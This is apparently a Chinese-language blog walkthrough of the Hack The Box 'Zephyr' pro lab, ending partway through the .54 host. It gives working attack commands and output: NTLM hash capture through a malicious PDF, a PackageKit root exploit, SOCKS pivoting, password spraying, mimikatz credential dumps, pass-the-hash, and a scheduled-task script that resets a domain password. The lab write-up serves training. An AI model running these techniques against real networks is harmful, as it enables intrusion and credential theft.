---
title: Zephyr
date: 2026-07-21 17:23:57
categories:
  - htb prolab
tags:
  - HTB
  - Prolab
  - Zephyr
  - 内网渗透
---
### ZEPHYR-MAIL(.51)

扫描网段。发现

10.10.110.2和10.10.110.35存活

扫描端口

```
                                                                                                                                                          
┌──(root㉿kali)-[~]
└─# nmap --min-rate 10000 -A -Pn -sV -sC -p- 10.10.110.35
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 21:12 -0400
Nmap scan report for 10.10.110.35
Host is up (0.44s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=painters.htb/countryName=GB
| Subject Alternative Name: DNS:mail.painters.htb, IP Address:192.168.110.51
| Not valid before: 2022-04-04T10:00:52
|_Not valid after:  2032-04-01T10:00:52
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (92%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.19 - 5.15 (92%), Linux 4.15 - 5.19 (85%), Linux 5.0 - 5.14 (85%), Linux 4.15 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   543.71 ms 10.10.16.1
2   543.82 ms 10.10.110.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.50 seconds

```

painters.htb加入/etc/hosts

打开80端口界面

![image-20260713091937421](/images/htb-prolab/zephyr/20260713091944926.png)

分析https://painters.htb/static/js/main.js

得到

![image-20260713093907445](/images/htb-prolab/zephyr/20260713093907542.png)

只允许上传pdf

进行目录扫描寻找文件上传点

```
ffuf -u https://painters.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ac -t 100

```

![image-20260713095222865](/images/htb-prolab/zephyr/20260713095222956.png)

![image-20260713095347762](/images/htb-prolab/zephyr/20260713095347829.png)

访问?id=1

找到文件上传点，是有个简历上传功能 制作恶意的pdf

smb链接钓鱼

msf生成钓鱼pdf

responder -I tun0 -v --lm --disable-ess

![image-20260715091235938](/images/htb-prolab/zephyr/20260715091236089.png)

![image-20260715091318355](/images/htb-prolab/zephyr/20260715091318494.png)

成功窃取到了用户riley的hash值

```
Stopping job 2
msf auxiliary(server/capture/smb) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/capture/smb

msf auxiliary(server/capture/smb) > 
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 10.10.110.35
[SMB] NTLMv2-SSP Username   : PAINTERS\riley
[SMB] NTLMv2-SSP Hash       : riley::PAINTERS:2342646faeceab11:0f9f7428f0c1eac8a0839fb9ed0d3cc1:010100000000000000b20a519712dd015ae7b9d7eaf7a062000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f00550050000700080000b20a519712dd01060004000200000008003000300000000000000000000000002000003944e38ec1bcde4738605f0f334359af0e2f3c9f9970169e403fc383f50bb5780a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340037000000000000000000



```

![image-20260713151816682](/images/htb-prolab/zephyr/20260713151816745.png)

账号:riley 密码:P@ssw0rd

ssh连接入口机

接着ssh连接靶机

#### ssh

```
ssh riley@10.10.110.35 
```

![image-20260713152118965](/images/htb-prolab/zephyr/20260713152119023.png)

进行信息收集

机子ip是192.168.110.51

上传linpeas进行自动收集

```
curl -O http://10.10.16.47/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /~/linpeas.txt
```

![image-20260715091337541](/images/htb-prolab/zephyr/20260715091337687.png)

| 项目            | 值                                  |
| --------------- | ----------------------------------- |
| **OS**          | Ubuntu 20.04.6 LTS (focal)          |
| **Kernel**      | 5.4.0-216-generic                   |
| **当前用户**    | riley (uid 1003)，**不在 sudo 组**  |
| **sudo 组用户** | **matt** (uid 1000)                 |
| **用户 flag**   | `/home/riley/flag.txt` (riley 可读) |

CVE-2026-41651

linpeas 已确认 **PackageKit 1.1.13 存在漏洞**，且 D-Bus 可触发：

```

Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.1.13

pkcon/pkmon present - daemon can be activated on demand via D-Bus
```

这是 2026 年的漏洞，对于 Ubuntu 20.04 + PackageKit 1.1.13 基本是必中的。

python3 cve-2026-41651.py  --check

![image-20260715091349641](/images/htb-prolab/zephyr/20260715091349763.png)

```
ZEPHYR{L34v3_N0_St0n3_Un7urN3d}
```

在当前bash里运行

python3 -c "import os; os.setuid(0); os.seteuid(0); os.execlp('bash','bash')"

![image-20260713171728485](/images/htb-prolab/zephyr/20260713171728539.png)

端口转发到1080端口上

```
ssh -D 1080 -N -f riley@10.10.110.35
```

或者chisel搭建代理

```
root@mail:~# ./chisel client 10.10.16.47:8000 R:socks
2026/07/13 10:30:09 client: Connecting to ws://10.10.16.47:8000
2026/07/13 10:30:54 client: Connection error: dial tcp 10.10.16.47:8000: i/o timeout
2026/07/13 10:30:54 client: Retrying in 100ms...
2026/07/13 10:31:39 client: Connection error: dial tcp 10.10.16.47:8000: i/o timeout (Attempt: 1)
2026/07/13 10:31:39 client: Retrying in 200ms...
2026/07/13 10:32:25 client: Connection error: dial tcp 10.10.16.47:8000: i/o timeout (Attempt: 2)
2026/07/13 10:32:25 client: Retrying in 400ms...
2026/07/13 10:33:10 client: Connection error: dial tcp 10.10.16.47:8000: i/o timeout (Attempt: 3)
2026/07/13 10:33:10 client: Retrying in 800ms...
^C2026/07/13 10:33:22 client: Connection error: dial tcp 10.10.16.47:8000: operation was canceled (Attempt: 4)
2026/07/13 10:33:22 client: Retrying in 1.6s...
2026/07/13 10:33:22 client: Cancelled
root@mail:~# nohup ./chisel client 10.10.16.47:8000 R:socks > /dev/null 2>&1 &
[1] 857089

```

kali端

```
──(root㉿kali)-[~]
└─# ./chisel server -p 8000 --reverse
2026/07/13 06:11:22 server: Reverse tunnelling enabled
2026/07/13 06:11:22 server: Fingerprint tmzlicKw8C46LzJJV7YbDqfPDwcvih3r6bDqTurFBsQ=
2026/07/13 06:11:22 server: Listening on http://0.0.0.0:8000

```

fscan扫描存活主机

```
oot@mail:~# ./fscan-linux -h 192.168.110.1/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan 2.1.2 (db0b53b 2026-04-25T10:15:30Z)
                                                                                                                                                           
[*] 服务插件: neo4j, elasticsearch, ftp, smtp, ldap ... 等24个                                                                                             
[*] 192.168.110.1 存活 (协议: ICMP)
[*] 192.168.110.51 存活 (协议: ICMP)
[*] 192.168.110.55 存活 (协议: ICMP)
[*] 192.168.110.53 存活 (协议: ICMP)
[*] 192.168.110.52 存活 (协议: ICMP)
[*] 192.168.110.54 存活 (协议: ICMP)

```

或者命令

```
for i in $(seq 1 254); do (ping -c1 -W1 192.168.110.$i >/dev/null 2>&1 && echo "192.168.110.$i alive") & done
```

存活主机有

```
192.168.110.1
192.168.110.51
192.168.110.52
192.168.110.53
192.168.110.54
192.168.110.55
192.168.110.56：5985
```

进行端口扫描

```
./fscan-linux -h 192.168.110.51-55 -p 1-65535 -t 200 -nopoc -nobr -silent
```

![image-20260715092036070](/images/htb-prolab/zephyr/20260715092036183.png)

确认用户是否是域成员，且拥有对域控的smb访问权限

```
                                                                                                                                           
┌──(root㉿kali)-[~]
└─# proxychains nxc smb 192.168.110.55 -u riley -p 'P@ssw0rd' -d painters.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:135  ...  OK
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:445  ...  OK
SMB         192.168.110.55  445    DC               [+] painters.htb\riley:P@ssw0rd 
                                                                                     
```

 域控是 `DC.painters.htb`，Windows Server 2022。现在立即收集 BloodHound 数据，找出通往域管的路径。

```
proxychains4 bloodhound-python -d painters.htb -u riley -p 'P@ssw0rd' -dc dc.painters.htb -ns 192.168.110.55 -c All --zip --dns-tcp

```

./BloodHound --no-sandbox   

![image-20260713211209898](/images/htb-prolab/zephyr/20260714092514437.png)权限图谱关键信息：

![image-20260714094553411](/images/htb-prolab/zephyr/20260714094553593.png)

RILEY 对 **域对象 PAINTERS.HTB** 拥有：

```
WriteDacl` + `GenericAll` + `AddKeyCredentialLink
```

```
                                                                                                                                                          
┌──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# proxychains python3 ./GetUserSPNs.py painters.htb/riley:'P@ssw0rd' -dc-ip 192.168.110.55 -request -outputfile /tmp/kerberoast.txt
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:389  ...  OK
ServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation  
---------------------  -------  --------  --------------------------  --------------------------  -----------
HTTP/dc.painters.htb   blake              2026-07-13 03:18:34.335453  2026-07-13 03:18:39.679206  constrained 
HTTP/svc.painters.htb  web_svc            2023-05-24 02:50:47.043365  2026-07-13 02:46:40.278569              



[-] CCache file is not found. Skipping...
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:88  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:88  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:88  ...  OK
[-] Principal: painters.htb\blake - Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:88  ...  OK
[-] Principal: painters.htb\web_svc - Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
                                                                                                                         
```

发现两用户blake 和web_svc

可以知道web-svc是—**PNT-SVRSVC**。nxc 之前显示 PNT-SVRSVC 的 IP 是 **192.168.110.52**。

利用密码喷洒，爆破web-svc的明文密码

### ZEPHYR-WKST(.56)

![image-20260714103156170](/images/htb-prolab/zephyr/20260714103156396.png)

riley 确实可以直接 WinRM 登录 WKST！

进入56这个机子上 权限是本地管理员，拿下flag

```
proxychains evil-winrm -i 192.168.110.56 -u riley -p 'P@ssw0rd'

```

![image-20260714103525953](/images/htb-prolab/zephyr/20260714103526032.png)

![image-20260714105101392](/images/htb-prolab/zephyr/20260714105101482.png)

```
ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}
```

```
# 创建目录
mkdir C:\Temp -Force

# 重新保存
wmic process call create "cmd /c reg save HKLM\SAM C:\Temp\sam.save"
wmic process call create "cmd /c reg save HKLM\SYSTEM C:\Temp\system.save"

# 确认
dir C:\Temp\
```

Kali 终端

```bash
# 查看 Kali 的代理 IP
ip addr show tun0 | grep inet

# 开 SMB 共享
sudo impacket-smbserver share /root/ -smb2support
```

evil-winrm 里

```powershell
# 假设 Kali 的 IP 是 10.10.16.47
copy C:\Temp\sam.save \\10.10.16.47\share\
copy C:\Temp\system.save \\10.10.16.47\share\
```

成功后 Kali 的 `/root/` 下就会有这两个文件，然后：

```bash
impacket-secretsdump -sam /root/sam.save -system /root/system.save LOCAL
没有其他账户
```

```
proxychains nxc smb 192.168.110.51-56 -u riley -p 'P@ssw0rd' --shares

```

| 机器         | IP     | SMB       | 共享                      |
| ------------ | ------ | --------- | ------------------------- |
| PNT-SVRSVC   | .52    | ✅ 认证    | 仅 IPC$，无 C$/ADMIN$     |
| PNT-SVRBPA   | .53    | ✅ 认证    | 仅 IPC$，无 C$/ADMIN$     |
| DC           | .55    | ✅ 认证    | NETLOGON + SYSVOL（只读） |
| PNTPSB (.51) | .51    | ❌ 445超时 |                           |
| 其他         | .54/56 | ❌ 445超时 |                           |

查询所有域用户

```
──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# proxychains nxc ldap 192.168.110.55 -u riley -p 'P@ssw0rd' --users
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:389  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:636  ...  OK
LDAP        192.168.110.55  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:painters.htb) (signing:None) (channel binding:No TLS cert)                                                                                                                                                  
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:389  ...  OK
LDAP        192.168.110.55  389    DC               [+] painters.htb\riley:P@ssw0rd 
LDAP        192.168.110.55  389    DC               [*] Enumerated 10 domain users: painters.htb
LDAP        192.168.110.55  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                               
LDAP        192.168.110.55  389    DC               Administrator                 2022-05-17 10:08:35 0        Built-in account for administering the computer/domain                                                                                                                                                 
LDAP        192.168.110.55  389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                                                                               
LDAP        192.168.110.55  389    DC               krbtgt                        2022-03-06 11:18:53 0        Key Distribution Center Service Account     
LDAP        192.168.110.55  389    DC               riley                         2023-05-26 03:22:35 0                                                    
LDAP        192.168.110.55  389    DC               blake                         2022-03-06 14:43:06 0                                                    
LDAP        192.168.110.55  389    DC               gavin                         2022-03-06 14:45:07 0                                                    
LDAP        192.168.110.55  389    DC               daniel                        2022-03-06 14:45:34 0                                                    
LDAP        192.168.110.55  389    DC               tom                           2022-03-06 14:45:49 0                                                    
LDAP        192.168.110.55  389    DC               web_svc                       2023-05-24 02:50:47 0                                                    
LDAP        192.168.110.55  389    DC               Matt                          2022-10-19 17:23:30 0        Administrator of Web Server                 
                                                                                                                                       
```

### ZEPHYR-PNTSVC (.52)

通过密码喷洒，取得

```
proxychains nxc winrm 192.168.110.52 -u web_svc -p '!QAZ1qaz' --continue-on-success
```

接着evil-winrm登录远程连接机器 whoami查看权限

```
proxychains evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'
```

![image-20260714143513997](/images/htb-prolab/zephyr/20260714143514394.png)



**web_svc 是 PNT-SVRSVC 的本地管理员**

```
ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}
```

拿下第三台机器flag

收集域内所有信息

```
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```

```
cd C:\Temp          # 切换远程工作目录到文件所在位置
download C:\Temp\sam.save /root/桌面/sam.save
download C:\Temp\system.save /root/桌面/system.save

upload /root/桌面/mimikatz.exe m.exe
```

上传mimikatz，得到

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\m.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

584     {0;000003e7} 1 D 44803          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00699d10} 0 D 7057553     PAINTERS\web_svc        S-1-5-21-1470357062-2280927533-300823338-1111   (09g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 7077779     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : PNT-SVRSVC
SysKey : b131ea5c8206a94e3d32119d035961a9
Local SID : S-1-5-21-1894836871-1209905952-3336604744

SAMKey : 21027b48a361fb0094c6eb79509e228d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6ee87fa6593a4798fe651f5f5a4e663e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a3896a66cc19131b074f0463d56587c

* Primary:Kerberos-Newer-Keys *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e2638a592bf8df16ae7a16d5f1e0ff945af694ea1cb0c96cc718f30371677dd7
      aes128_hmac       (4096) : 3e2a98999ef9cef8c1e41928257487c9
      des_cbc_md5       (4096) : fb64f42680042c52
    OldCredentials
      aes256_hmac       (4096) : 5c0ecc5dccd087cac3ec672f714c2119ab655a9f0b6b51bf75da22179dfee76a
      aes128_hmac       (4096) : d6477c485507bb6f1454cedc0af950f6
      des_cbc_md5       (4096) : ab7fe0ece5b67c5d
    OlderCredentials
      aes256_hmac       (4096) : cb7a55cfd2a867b40baa0f8148f327afce1b1b70e07a49ceecb33d3b379d42ce
      aes128_hmac       (4096) : da4f9d36f93e1c0af67f8af0805ff692
      des_cbc_md5       (4096) : e3fb1c49927a891c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Credentials
      des_cbc_md5       : fb64f42680042c52
    OldCredentials
      des_cbc_md5       : ab7fe0ece5b67c5d


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : James
  Hash NTLM: 8af1903d3c80d3552a84b6ba296db2ea

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e159b53fdb4574ab6bed0660156ffcc6

* Primary:Kerberos-Newer-Keys *
    Default Salt : SVC.PAINTERS.HTBJames
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ab256c5e77a17fc0234eeada495d8ea573b2c3e90d9e5d24d2dba7d4e9792c23
      aes128_hmac       (4096) : 8d68c286c5716ed9213092b1281f24c5
      des_cbc_md5       (4096) : 1f54a21c86cbd6ef

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : SVC.PAINTERS.HTBJames
    Credentials
      des_cbc_md5       : 1f54a21c86cbd6ef


mimikatz(commandline) # exit
Bye!
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

得到了Administrator和james的NTLM的hash

```
Administrator: 6ee87fa6593a4798fe651f5f5a4e663e
James:         8af1903d3c80d3552a84b6ba296db2ea
```

James 是本地账户，对域控无直接价值

### ZEPHYR-PNTBPA (.53)

用 James 哈希喷其他机器

SAM 哈希反推机器归属

刚才在 **PNT-SVRSVC (.52)** 上 dump SAM 时，看到 James 的 `Default Salt`：

```
Default Salt : SVC.PAINTERS.HTBJames
```

这里的 `SVC` 就是机器名 `PNT-SVRSVC` 的短名。说明 **James 是 PNT-SVRSVC 的本地用户**（不是域用户）

之前 PNT-SVRBPA (.53) 有 5985 端口，James 可能是那台的本地管理员：

```
 proxychains nxc winrm 192.168.110.53 -u James -H '8af1903d3c80d3552a84b6ba296db2ea' --local-auth
```

![](/images/htb-prolab/zephyr/20260714154025255.png)

拿下第四个flag

ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}

```
upload /root/桌面/mimikatz.exe m.exe
```

```
mimikatz(commandline) # lsadump::sam
Domain : PNT-SVRBPA
SysKey : 796eebc028df9ad69c64f87d7886be77
Local SID : S-1-5-21-2952569584-3195625271-31431492

SAMKey : b6a83a5dc3d09ffaae2e3992535504ae

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 23ea5ff648e7ec7dcd1bfef8e9434099

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7b1cedf73b1b448644acdf09f02c772f

* Primary:Kerberos-Newer-Keys *
    Default Salt : PNT-SVRBPA.PAINTERS.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4e0ad47649eb170aa834c2d523c3dd251c82870d22b10289106788be469b8b1f
      aes128_hmac       (4096) : 7ce04dd700b73aae9b5d94315972200a
      des_cbc_md5       (4096) : 91166bf786c19b4f
    OldCredentials
      aes256_hmac       (4096) : 960d854d0cc119cec75cae1694ca559553669cd7dff0ee81a99359720b3fa3aa
      aes128_hmac       (4096) : 2db668cd0667aa83a084d83506827afe
      des_cbc_md5       (4096) : c176e91040f4208c
    OlderCredentials
      aes256_hmac       (4096) : c2dc69159b14db34fe2d4752332d4ef517266cb81fe459653e5fafc473ad4827
      aes128_hmac       (4096) : 2605c4299898c08c2dfe64eda90ec922
      des_cbc_md5       (4096) : 34b58ab091c75e08

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : PNT-SVRBPA.PAINTERS.HTBAdministrator
    Credentials
      des_cbc_md5       : 91166bf786c19b4f
    OldCredentials
      des_cbc_md5       : c176e91040f4208c


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : James
  Hash NTLM: 8af1903d3c80d3552a84b6ba296db2ea

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 034d74c9d3edc55187fb2928803838b7

* Primary:Kerberos-Newer-Keys *
    Default Salt : BYPASS.PAINTERS.HTBJames
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a14bd497f5306222ef53e2f2f0ff1a4dfbc2f306708a8420044f71d87a4025c6
      aes128_hmac       (4096) : bc0cec1f4d19c09edb9ac0a90a0fc321
      des_cbc_md5       (4096) : dc373e4cae61e5fb

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BYPASS.PAINTERS.HTBJames
    Credentials
      des_cbc_md5       : dc373e4cae61e5fb


mimikatz(commandline) # exit

```



net user James /domain
whoami /all

```
User Name        SID
================ ============================================
pnt-svrbpa\james S-1-5-21-2952569584-3195625271-31431492-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```

```
upload /root/桌面/procdump.exe pr.exe
.\pr.exe -accepteula -ma lsass.exe lsass.dmp
download lsass.dmp
# Kali 上解析
pypykatz lsa minidump /root/lsass.dmp
```

lsass dump 里没有缓存的域用户凭据，只有机器账户

```
upload /root/桌面/Rubeus.exe r.exe
./r.exe kerberoast /spn:"HTTP/dc.painters.htb" /outfile: blake.txt
```

在 PNT-SVRBPA 上已经是 SYSTEM（James 是管理员），所以能直接用 **机器账户 PNT-SVRBPA$** 的权限来操作

![image-20260715091424204](/images/htb-prolab/zephyr/20260715091424339.png)

```
──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# # 在当前目录用 Python 跑
proxychains python3 ./changepasswd.py painters.htb/'PNT-SVRBPA$':@192.168.110.55 \
  -newpass 'Bl@ke123456!' -hashes :2dfcebbe9f5f4cb3bf98032887b3d7b6
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of painters.htb\PNT-SVRBPA$
[*] Connecting to DCE/RPC as painters.htb\PNT-SVRBPA$
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:445  ...  OK
[*] Password was changed successfully.

```

### ZEPHYR-PNTPSB(.54)

机器账户对blake有ForceChangePassword更改密码的权限

写system的任务脚本，更改black密码

```
mkdir C:\Temp -Force
@"
try {
    `$searcher = [adsisearcher]"samaccountname=blake"
    `$result = `$searcher.FindOne()
    `$user = [ADSI](`$result.Path)
    `$user.SetPassword("P@ssw0rd123!")
    `$user.pwdLastSet = -1
    `$user.SetInfo()
    "DONE" | Out-File C:\Temp\res.txt
} catch {
    `$_.Exception.Message | Out-File C:\Temp\res.txt
}
"@ | Out-File C:\Temp\reset.ps1

schtasks /create /tn resetpwd /tr "powershell -ep bypass C:\Temp\reset.ps1" /ru SYSTEM /sc once /st 23:59 /f
schtasks /run /tn resetpwd
Start-Sleep 6
Get-Content C:\Temp\res.txt
schtasks /delete /tn resetpwd /f
```

![image-20260715091435411](/images/htb-prolab/zephyr/20260715091435546.png)

修改成功

使用 blake 账户枚举  smb 和  1 2 winrm 协议:

```
 proxychains -q nxc smb ips -u 'blake' -p 'P@ssw0rd123!'

proxychains -q nxc winrm ips -u 'blake' -p P@ssw0rd123!'

```

```
proxychains evil-winrm -i 192.168.110.54 -u blake -p 'P@ssw0rd123!'
```

```
Evil-WinRM* PS C:\Users\Blake\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
painters\blake S-1-5-21-1470357062-2280927533-300823338-1107


GROUP INFORMATION
-----------------

